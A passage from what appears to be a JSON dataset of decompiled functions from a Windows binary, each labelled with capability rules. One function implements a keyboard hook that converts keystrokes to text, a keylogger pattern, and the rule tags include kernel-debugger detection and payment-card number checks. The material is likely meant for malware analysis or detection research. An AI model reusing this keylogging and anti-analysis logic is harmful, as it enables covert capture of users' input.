uStack3176 = 0x47adec;\n            piStack3164 = &stack0xfffffffc;\n            fcn.0048a6a4();\n            uStack3176 = 0x47adf4;\n            fcn.0048a4b0();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack3172;\n        }\n        piStack3164 = &stack0xfffff604;\n        piStack3168 = 0x47ae33;\n        fcn.00405964();\n        piStack3168 = 0x47ae43;\n        fcn.00405894();\n        if (uVar10) {\n            piStack3168 = 0x47ae57;\n            fcn.004059a4();\n            piStack3168 = 0x47ae64;\n            fcn.00405894();\n            if (uVar10) {\n                *0x498834 = 1;\n            }\n            else {\n                *0x498834 = 0;\n            }\n        }\n        piStack3168 = &stack0xfffff600;\n        piStack3172 = 0x47ae8f;\n        fcn.00405964();\n        piStack3172 = 0x47ae9f;\n        fcn.00405894();\n        if (uVar10) {\n            piStack3172 = 0x47aeb3;\n            fcn.004059a4();\n            piStack3172 = 0x498818;\n            uStack3176 = 0;\n            uStack3180 = 0x47aec2;\n            uStack3180 = fcn.004058fc();\n            pcStack3184 = fcn.00488974;\n            uStack3188 = 0;\n            uStack3192 = 0;\n            puStack3196 = 0x47aed1;\n            sub.kernel32.dll_CreateThread();\n        }\n        puStack3196 = &stack0xfffff5fc;\n        uStack3200 = 0x47aeea;\n        fcn.00405964();\n        uStack3200 = 0x47aefa;\n        fcn.00405894();\n        if (uVar10) {\n            uStack3200 = 0x47af0e;\n            fcn.004059a4();\n            uStack3200 = 0x498818;\n            uStack3204 = 0;\n            uStack3208 = 0x47af1d;\n            uStack3208 = fcn.004058fc();\n            pcStack3212 = fcn.004811a4;\n            uStack3216 = 0;\n            uStack3220 = 0;\n            puStack3224 = 0x47af2c;\n            sub.kernel32.dll_CreateThread();\n        }\n        puStack3224 = &stack0xfffff5f8;\n        uStack3228 = 0x47af45;\n        fcn.00405964();\n        uStack3228 = 0x47af55;\n        fcn.00405894();\n        if (uVar10) {\n            uStack3228 = 0x47af69;\n            fcn.004059a4();\n            uStack3228 = 0x498818;\n            uStack3232 = 0;\n            uStack3236 = 0x47af78;\n            uStack3236 = fcn.004058fc();\n            pcStack3240 = fcn.00480d18;\n            uStack3244 = 0;\n            uStack3248 = 0;\n            puStack3252 = 0x47af87;\n            sub.kernel32.dll_CreateThread();\n        }\n        puStack3252 = &stack0xfffff5f4;\n        puStack3256 = 0x47afa0;\n        fcn.00405964();\n        puStack3256 = 0x47afb0;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3256 = 0x47afc4;\n            fcn.004059a4();\n            puStack3256 = 0x47afd1;\n            fcn.004054c0();\n            puStack3256 = 0x47afde;\n            fcn.0048aa34();\n        }\n        puStack3256 = &stack0xfffff5f0;\n        uStack3260 = 0x47aff7;\n        fcn.00405964();\n        uStack3260 = 0x47b007;\n        fcn.00405894();\n        if (uVar10) {\n            uStack3260 = 0x47b01b;\n            fcn.004059a4();\n            uStack3260 = 0x47dad8;\n            uStack3264 = 0;\n            puStack3268 = 0x47b027;\n            sub.user32.dll_GetSystemMetrics();\n            puStack3268 = 0x47b032;\n            fcn.00409ce8();\n            puStack3268 = puStack2584;\n            uStack3272 = 0x47bbe4;\n            uStack3276 = 1;\n            uStack3280 = 0x47b044;\n            sub.user32.dll_GetSystemMetrics();\n            uStack3280 = 0x47b04f;\n            fcn.00409ce8();\n            uStack3280 = uStack2588;\n            puStack3284 = 0x47b065;\n            fcn.00405800();\n            puStack3284 = 0x47b070;\n            fcn.00472b58();\n        }\n        puStack3284 = &stack0xfffff5e0;\n        puStack3288 = 0x47b089;\n        fcn.00405964();\n        puStack3288 = 0x47b099;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3288 = 0x47b0b1;\n            fcn.004059a4();\n            puStack3288 = &fcn.00472f6c::var_1ch;\n            puStack3292 = 0x47b0c2;\n            fcn.00405a48();\n            puStack3292 = 0x47b0d2;\n            fcn.00405964();\n            puStack3292 = 0x47b0df;\n            fcn.00405a48();\n            puStack3292 = 0x47b0ee;\n            fcn.004059a4();\n            puStack3292 = &fcn.00472f6c::var_20h;\n            puStack3296 = 0x47b0ff;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            puStack3296 = 0x47b10f;\n            fcn.00405964();\n            puStack3296 = 0x47b11c;\n            fcn.00405a48();\n            puStack3296 = 0x47b12b;\n            fcn.004059a4();\n            puStack3296 = 0x47b136;\n            fcn.00405504();\n            puStack3296 = 0x47b13e;\n            puStack3296 = fcn.00409e54();\n            puStack3300 = 0x47b147;\n            fcn.00409e54();\n            puStack3296 = 0x47b152;\n            fcn.00481620();\n        }\n        puStack3296 = &stack0xfffff5dc;\n        puStack3300 = 0x47b16b;\n        fcn.00405964();\n        puStack3300 = 0x47b17b;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3300 = 0x47b18f;\n            fcn.004059a4();\n            puStack3304 = 0x47b1d6;\n            piStack3308 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff314;\n            piStack3312 = 0x47b1ab;\n            puStack3300 = &stack0xfffffffc;\n            fcn.0045e9b8();\n            piStack3312 = 0x47b1c1;\n            fcn.00405784();\n            piStack3312 = 0x47b1cc;\n            fcn.00472b58();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack3308;\n        }\n        puStack3300 = &stack0xfffff5d0;\n        puStack3304 = 0x47b20b;\n        fcn.00405964();\n        puStack3304 = 0x47b21b;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3304 = 0x47b22f;\n            fcn.004059a4();\n            piStack3308 = 0x47b24f;\n            piStack3312 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff310;\n            puStack3316 = 0x47b245;\n            puStack3304 = &stack0xfffffffc;\n            fcn.0048b18c();\n            uVar10 = 1;\n            *in_FS_OFFSET = piStack3312;\n        }\n        puStack3304 = &stack0xfffff5cc;\n        piStack3308 = 0x47b284;\n        fcn.00405964();\n        piStack3308 = 0x47b294;\n        fcn.00405894();\n        if (uVar10) {\n            piStack3308 = 0x47b2a8;\n            fcn.004059a4();\n            piStack3308 = 0x47b2b0;\n            fcn.0048b278();\n        }\n        piStack3308 = &stack0xfffff5c8;\n        piStack3312 = 0x47b2c9;\n        fcn.00405964();\n        piStack3312 = 0x47b2d9;\n        fcn.00405894();\n        if (uVar10) {\n            piStack3312 = 0x47b2ed;\n            fcn.004059a4();\n            piStack3312 = &fcn.00472f6c::var_1ch;\n            puStack3316 = 0x47b2fe;\n            iVar7 = fcn.00405a48();\n            uVar10 = iVar7 == 1;\n            puStack3316 = 0x47b30e;\n            fcn.00405964();\n            puStack3316 = 0x47b31b;\n            fcn.00405a48();\n            puStack3316 = 0x47b32a;\n            fcn.004059a4();\n            puStack3316 = 0x47b332;\n            fcn.00409e54();\n            puStack3316 = 0x47b33a;\n            fcn.004679cc();\n        }\n        puStack3316 = &stack0xfffff5c4;\n        puStack3320 = 0x47b353;\n        fcn.00405964();\n        puStack3320 = 0x47b363;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3320 = 0x47b37b;\n            fcn.004059a4();\n            puStack3320 = &fcn.00472f6c::var_1ch;\n            puStack3324 = 0x47b38c;\n            fcn.00405a48();\n            puStack3324 = 0x47b39c;\n            fcn.00405964();\n            puStack3324 = 0x47b3a9;\n            fcn.00405a48();\n            puStack3324 = 0x47b3b8;\n            fcn.004059a4();\n            puStack3324 = &fcn.00472f6c::var_20h;\n            puStack3328 = 0x47b3c9;\n            fcn.00405a48();\n            puStack3328 = 0x47b3d9;\n            fcn.00405964();\n            puStack3328 = 0x47b3e6;\n            fcn.00405a48();\n            puStack3328 = 0x47b3f5;\n            fcn.004059a4();\n            puStack3328 = 0x47b400;\n            fcn.00405504();\n            puStack3328 = 0x47b408;\n            fcn.0040546c();\n            uStack3332 = 0x47b460;\n            piStack3336 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff2f8;\n            piStack3340 = 0x47b41e;\n            puStack3328 = &stack0xfffffffc;\n            fcn.00489c6c();\n            piStack3340 = 0x47b42c;\n            fcn.00409af4();\n            if (piStack2624 != NULL) {\n                piStack3340 = 0x47b443;\n                fcn.00409af4();\n                piStack3340 = 0x47b456;\n                fcn.00405784();\n            }\n            *in_FS_OFFSET = piStack3336;\n            uStack3332 = 0x47b4ca;\n            piStack3336 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff2f8;\n            piStack3340 = 0x47b480;\n            puStack3328 = &stack0xfffffffc;\n            fcn.00468870();\n            piStack3340 = 0x47b48e;\n            fcn.00409af4();\n            if (puStack2632 != NULL) {\n                piStack3340 = var_2ch;\n                puStack3344 = 0x47b4a8;\n                fcn.00409af4();\n                puStack3344 = puStack2636;\n                piStack3348 = 0x47c2f8;\n                piStack3352 = 0x47b4c0;\n                fcn.00405800();\n            }\n            *in_FS_OFFSET = piStack3348;\n            puStack3344 = 0x47b534;\n            piStack3348 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff2ec;\n            piStack3352 = 0x47b4ea;\n            piStack3340 = &stack0xfffffffc;\n            fcn.0047106c();\n            piStack3352 = 0x47b4f8;\n            fcn.00409af4();\n            if (piStack2640 != NULL) {\n                piStack3352 = var_2ch;\n                piStack3356 = 0x47b512;\n                fcn.00409af4();\n                piStack3356 = piStack2644;\n                pcStack3360 = 0x47c2f8;\n                uStack3364 = 0x47b52a;\n                fcn.00405800();\n            }\n            *in_FS_OFFSET = piStack3348;\n            puStack3344 = 0x47b59e;\n            piStack3348 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff2ec;\n            piStack3352 = 0x47b554;\n            piStack3340 = &stack0xfffffffc;\n            fcn.00471c04();\n            piStack3352 = 0x47b562;\n            fcn.00409af4();\n            if (iStack2648 != 0) {\n                piStack3352 = var_2ch;\n                piStack3356 = 0x47b57c;\n                fcn.00409af4();\n                piStack3356 = piStack2652;\n                pcStack3360 = 0x47c2f8;\n                uStack3364 = 0x47b594;\n                fcn.00405800();\n            }\n            *in_FS_OFFSET = piStack3348;\n            puStack3344 = 0x47b608;\n            piStack3348 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff2ec;\n            piStack3352 = 0x47b5be;\n            piStack3340 = &stack0xfffffffc;\n            fcn.0045f31c();\n            piStack3352 = 0x47b5cc;\n            fcn.00409af4();\n            if (iStack2656 != 0) {\n                piStack3352 = var_2ch;\n                piStack3356 = 0x47b5e6;\n                fcn.00409af4();\n                piStack3356 = piStack2660;\n                pcStack3360 = 0x47c2f8;\n                uStack3364 = 0x47b5fe;\n                fcn.00405800();\n            }\n            *in_FS_OFFSET = piStack3348;\n            puStack3344 = 0x47b672;\n            piStack3348 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff2ec;\n            piStack3352 = 0x47b628;\n            piStack3340 = &stack0xfffffffc;\n            fcn.00460ce8();\n            piStack3352 = 0x47b636;\n            fcn.00409af4();\n            if (pcStack2664 != NULL) {\n                piStack3352 = var_2ch;\n                piStack3356 = 0x47b650;\n                fcn.00409af4();\n                piStack3356 = piStack2668;\n                pcStack3360 = 0x47c2f8;\n                uStack3364 = 0x47b668;\n                fcn.00405800();\n            }\n            *in_FS_OFFSET = piStack3348;\n            puStack3344 = 0x47b6dc;\n            piStack3348 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff2ec;\n            piStack3352 = 0x47b692;\n            piStack3340 = &stack0xfffffffc;\n            fcn.0045fe2c();\n            piStack3352 = 0x47b6a0;\n            fcn.00409af4();\n            if (iStack2672 != 0) {\n                piStack3352 = var_2ch;\n                piStack3356 = 0x47b6ba;\n                fcn.00409af4();\n                piStack3356 = piStack2676;\n                pcStack3360 = 0x47c2f8;\n                uStack3364 = 0x47b6d2;\n                fcn.00405800();\n            }\n            *in_FS_OFFSET = piStack3348;\n            piStack3340 = 0x14;\n            puStack3344 = 0x40;\n            piStack3348 = 0x47b6ef;\n            piVar5 = sub.kernel32.dll_LocalAlloc_1();\n            piStack3348 = 0x47b707;\n            piStack816 = piVar5;\n            fcn.00409af4();\n            piStack3348 = 0x47b718;\n            fcn.004054c0();\n            piStack3348 = 0x47b729;\n            fcn.004054c0();\n            piStack3348 = 0x47b73a;\n            fcn.004054c0();\n            piStack3348 = 0x47b74b;\n            fcn.004054c0();\n            uVar10 = piStack816 == 0xfffffff0;\n            piStack3348 = 0x47b75e;\n            fcn.004054c0();\n            piStack3348 = &fcn.00472f6c::var_2b4h;\n            piStack3352 = NULL;\n            pcStack3360 = fcn.00485178;\n            uStack3364 = 0;\n            uStack3368 = 0;\n            uStack3372 = 0x47b776;\n            piStack3356 = piVar5;\n            uStack3372 = sub.kernel32.dll_CreateThread();\n            puStack3376 = 0x47b77c;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        puStack3376 = &fcn.00472f6c::var_a78h;\n        puStack3380 = 0x47b795;\n        fcn.00405964();\n        puStack3380 = 0x47b7a5;\n        fcn.00405894();\n        if (uVar10) {\n            puStack3380 = 0x47b7bd;\n            fcn.004059a4();\n            puStack3384 = 0x47b822;\n            piStack3388 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffff2c4;\n            puStack3380 = &stack0xfffffffc;\n            sub.ole32.dll_CoInitialize();\n            fcn.0042b8c8();\n            fcn.00415b18();\n            fcn.00411604(0, &fcn.00472f6c::var_140h, 0x47dbc0, &fcn.00472f6c::var_4h);\n            fcn.004162c8();\n            uVar10 = 1;\n            *in_FS_OFFSET = NULL;\n        }\n        puStack3384 = &stack0xfffff57c;\n        piStack3388 = 0x47b845;\n        fcn.00405964();\n        piStack3388 = 0x47b855;\n        fcn.00405894();\n        if (uVar10) {\n            piStack3388 = 0x47b86d;\n            fcn.004059a4();\n            *in_FS_OFFSET = &stack0xfffff2bc;\n            piStack3388 = &stack0xfffffffc;\n            fcn.00405a48(&fcn.00472f6c::var_1ch);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48(&fcn.00472f6c::var_20h);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405504();\n            piVar5 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n            piStack820 = piVar5;\n            fcn.0046ec70();\n            fcn.004054c0();\n            fcn.004054c0();\n            fcn.004054c0();\n            fcn.004054c0();\n            fcn.004054c0();\n            in_stack_fffff2a4 = NULL;\n            piVar5 = sub.kernel32.dll_CreateThread(0, 0, fcn.00485178, piVar5, 0, &fcn.00472f6c::var_2b4h);\n            sub.kernel32.dll_CloseHandle_1();\n            uVar10 = 1;\n            *in_FS_OFFSET = piVar5;\n        }\n        piVar5 = &fcn.00472f6c::var_a88h;\n        fcn.00405964();\n        fcn.00405894();\n        if (uVar10) {\n            fcn.004059a4();\n            fcn.00461f64();\n        }\n        *in_FS_OFFSET = piVar5;\n    }\ncode_r0x0047ba11:\n    *in_FS_OFFSET = in_stack_fffff2a4;\n    fcn.00405490(0x47bba0);\n    fcn.004070f8();\n    fcn.00405490();\n    fcn.00406a20();\n    fcn.00405490();\n    fcn.00405490();\n    fcn.004070f8();\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.00405c48();\n    fcn.004070f8();\n    fcn.00405c48();\n    fcn.00406018();\n    fcn.00405490();\n    fcn.00405490();\n    fcn.00405490();\n    fcn.0040546c();\n    fcn.00405490();\n    fcn.00405490();\n    fcn.00405fcc();\n    fcn.00405490();\n    fcn.004115fc();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 71130
    },
    "00480364": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480364(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar6;\n    int32_t *piStack300;\n    uint uStack296;\n    uchar *puStack292;\n    int32_t *piStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack284 = 0x4807e9;\n    piStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack288;\n    uStack296 = 0x4807b0;\n    piStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack300;\n    if ((arg_8h < 0) || (puVar1 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  arg_8h == 3)) {\n        sub.user32.dll_CallNextHookEx(*0x49b9a4, arg_8h, arg_ch, arg_10h);\n        puVar1 = puStack292;\n        puVar2 = puStack280;\n    }\n    puStack280 = puVar2;\n    puStack292 = puVar1;\n    if ((arg_8h != 0) || (arg_ch != 0x100)) goto code_r0x0048078d;\n    cVar3 = fcn.0048034c();\n    if (cVar3 != '\\0') {\n        sub.user32.dll_CallNextHookEx(*0x49b9a4, 0, 0x100, arg_10h);\n    }\n    iVar4 = *arg_10h;\n    if (iVar4 < 0x2f) {\n        if (iVar4 == 0x2e) {\n            fcn.00405504();\n            goto code_r0x00480773;\n        }\n        if (iVar4 - 8U < 0x26) {\n    // switch table (38 cases) at 0x480418\n            switch(*((iVar4 - 8U) * 4 + 0x480418)) {\n            case 0x480547:\n                fcn.00405504();\n                break;\n            case 0x480559:\n                fcn.00405504();\n                break;\n            case 0x48056b:\n                fcn.00405504();\n                break;\n            case 0x48057d:\n                fcn.00405504();\n                break;\n            case 0x480643:\n                fcn.00405504();\n                break;\n            case 0x480655:\n                fcn.00405504();\n                break;\n            case 0x480667:\n                fcn.00405504();\n                break;\n            case 0x480679:\n                fcn.00405504();\n                break;\n            case 0x48068b:\n                fcn.00405504();\n                break;\n            case 0x48069d:\n                fcn.00405504();\n                break;\n            default:\n                goto code_r0x004806af;\n            }\n            goto code_r0x00480773;\n        }\ncode_r0x004806af:\n        sub.user32.dll_GetKeyState(0x14);\n        sub.user32.dll_GetKeyState(0x11);\n        sub.user32.dll_GetKeyState(0xa0);\n        sub.user32.dll_GetKeyState();\n        if (cVar3 == '\\0') {\n            sub.user32.dll_GetKeyboardState();\n            iVar4 = fcn.0040f284();\n            if (iVar4 != 0) {\n                fcn.00405b8c();\n                uVar5 = fcn.0040595c(0);\n                sub.user32.dll_MapVirtualKeyA(*arg_10h, 0, &var_104h, uVar5);\n                iVar4 = sub.user32.dll_ToAscii();\n                if (iVar4 == 0) {\n                    fcn.0040546c();\n                }\n                else if (iVar4 == 1) {\n                    fcn.00405b8c();\n                }\n                else if (iVar4 != 2) {\n                    fcn.0040546c();\n                }\n            }\n        }\n    }\n    else {\n        if (0x20 < iVar4 - 0x70U) goto code_r0x004806af;\n    // switch table (33 cases) at 0x4804c3\n        switch(*((iVar4 - 0x70U) * 4 + 0x4804c3)) {\n        case 0x48058f:\n            fcn.00405504();\n            break;\n        case 0x4805a1:\n            fcn.00405504();\n            break;\n        case 0x4805b3:\n            fcn.00405504();\n            break;\n        case 0x4805c5:\n            fcn.00405504();\n            break;\n        case 0x4805d7:\n            fcn.00405504();\n            break;\n        case 0x4805e9:\n            fcn.00405504();\n            break;\n        case 0x4805fb:\n            fcn.00405504();\n            break;\n        case 0x48060d:\n            fcn.00405504();\n            break;\n        case 0x48061f:\n            fcn.00405504();\n            break;\n        default:\n            goto code_r0x004806af;\n        }\n    }\ncode_r0x00480773:\n    fcn.0047fd84();\n    if (**0x492868 == 1) {\n        fcn.004801ac();\n    }\ncode_r0x0048078d:\n    piVar6 = *0x49b9a4;\n    sub.user32.dll_CallNextHookEx(*0x49b9a4, arg_8h, arg_ch);\n    *in_FS_OFFSET = piVar6;\n    *in_FS_OFFSET = arg_10h;\n    fcn.0040546c(0x4807f0);\n    return;\n}\n",
        "token_count": 1410
    },
    "004015c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015c0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    param_1 = param_1 + -4;\n    iVar1 = -param_1;\n    do {\n        *(iVar1 + param_2 + param_1) = ROUND(*(iVar1 + in_EAX + param_1));\n        iVar1 = iVar1 + 8;\n    } while (iVar1 < 0);\n    *(iVar1 + param_2 + param_1) = *(iVar1 + in_EAX + param_1);\n    return;\n}\n",
        "token_count": 143
    },
    "004016e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004016e8(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    fcn.0040167c();\n    puVar3 = sub.kernel32.dll_VirtualAlloc(0, 0x13fff0, 0x1000, 4);\n    puVar1 = *0x49370c;\n    if (puVar3 != NULL) {\n        *puVar3 = 0x493708;\n        puVar2 = puVar3;\n        puVar3[1] = *0x49370c;\n        *0x49370c = puVar2;\n        *puVar1 = puVar3;\n        puVar3[0x4fffb] = 2;\n        *0x493720 = 0x13ffe0 - in_EAX;\n        *0x49371c = puVar3 + (0x13fff0 - in_EAX);\n        iVar4 = *0x49371c;\n        *(*0x49371c + -4) = in_EAX | 2;\n        return iVar4;\n    }\n    *0x493720 = 0;\n    return 0;\n}\n",
        "token_count": 280
    },
    "004022c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004022c0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (*(in_EAX + -4) & 0xfffffff0) + in_EAX;\n    if ((*(iVar1 + -4) & 0xfffffff0) == 0) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 91
    },
    "00402324": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402324(int32_t *param_1, int32_t **param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    *param_2 = in_EAX + 8;\n    iVar1 = *in_EAX;\n    if ((in_EAX == *(iVar1 + 0x10)) && (*(iVar1 + 8) < *(iVar1 + 0xc) || *(iVar1 + 8) == *(iVar1 + 0xc))) {\n        *param_1 = *(iVar1 + 8) + -1;\n        return;\n    }\n    *param_1 = in_EAX + ((in_EAX[-1] & 0xfffffff0U) - *(iVar1 + 2));\n    return;\n}\n",
        "token_count": 176
    },
    "00403414": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nfloat10 fcn.00403414(float10 param_1)\n\n{\n    return param_1 - ROUND(param_1);\n}\n",
        "token_count": 28
    },
    "0040572c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040572c(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "00406360": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406360(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004058fc();\n    iVar1 = fcn.004055ac(in_EAX);\n    *(param_2 + iVar1 * 2) = 0;\n    return param_2;\n}\n",
        "token_count": 112
    },
    "004063bc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.004063bc(void)\n\n{\n    fcn.00405cac();\n    return 0;\n}\n",
        "token_count": 25
    },
    "00406888": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406888(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **in_EAX;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = *in_EAX;\n    iVar5 = *arg_8h;\n    if (iVar5 < 1) {\n        if (iVar5 < 0) {\n            fcn.00403040();\n        }\n        fcn.00406880();\n    }\n    else {\n        var_10h = 0;\n        if (piVar3 != NULL) {\n            var_10h = piVar3[-1];\n            piVar3 = piVar3 + -2;\n        }\n        iVar4 = in_EDX + *(in_EDX + 1);\n        iVar1 = *(iVar4 + 2);\n        piVar2 = *(iVar4 + 6);\n        if (piVar2 == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = *piVar2;\n        }\n        if ((iVar5 * iVar1) / iVar5 != iVar1) {\n            fcn.00403040();\n        }\n        if ((piVar3 == NULL) || (*piVar3 == 1)) {\n            if ((iVar5 < var_10h) && (iVar4 != 0)) {\n                fcn.00406878();\n            }\n            fcn.00402f24();\n        }\n        else {\n            *piVar3 = *piVar3 + -1;\n            piVar3 = fcn.00402ef0();\n            var_14h = var_10h;\n            if (iVar5 < var_10h) {\n                var_14h = iVar5;\n            }\n            if (iVar4 == 0) {\n                fcn.004030ec();\n            }\n            else {\n                fcn.00403aac();\n                fcn.00406868(var_14h);\n            }\n        }\n        *piVar3 = 1;\n        piVar3[1] = iVar5;\n        fcn.00403aac();\n        if ((1 < in_ECX) && (-1 < iVar5 + -1)) {\n            do {\n                fcn.00406888(arg_8h + 1);\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        *in_EAX = piVar3 + 2;\n    }\n    return;\n}\n",
        "token_count": 628
    },
    "00407430": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040747c)\n\nvoid fcn.00407430(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint arg_8h;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4074dc;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.0040546c();\n    bVar3 = true;\n    arg_8h = 0x407461;\n    fcn.00405df4();\n    if (!bVar3) {\n        fcn.00405de8();\n        fcn.00405b8c();\n        arg_8h = fcn.00405de8();\n        uVar1 = fcn.00405dd8();\n        fcn.004058fc(uVar1);\n        iVar2 = fcn.00407224(arg_8h);\n        if (iVar2 < 1) {\n            fcn.0040546c();\n        }\n        else {\n            fcn.00405b8c();\n        }\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack28 = 0x4074e3;\n    uStack32 = 0x4074db;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 353
    },
    "004074ec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004074ec(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x407597;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = 0x407514;\n    fcn.00405c48();\n    if (in_EAX != 0) {\n        fcn.00405ec4();\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        iVar2 = fcn.00405de8();\n        uVar1 = fcn.004058fc(iVar2 + 1);\n        fcn.00405dd8(uVar1);\n        iVar2 = fcn.00407300(in_EAX);\n        if (iVar2 < 1) {\n            fcn.00405c48();\n            iVar2 = in_EAX;\n        }\n        else {\n            fcn.00405ec4();\n            iVar2 = in_EAX;\n        }\n        fcn.00405c84();\n    }\n    *in_FS_OFFSET = iVar2;\n    uStack32 = 0x40759e;\n    iStack36 = 0x407596;\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 354
    },
    "00409754": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
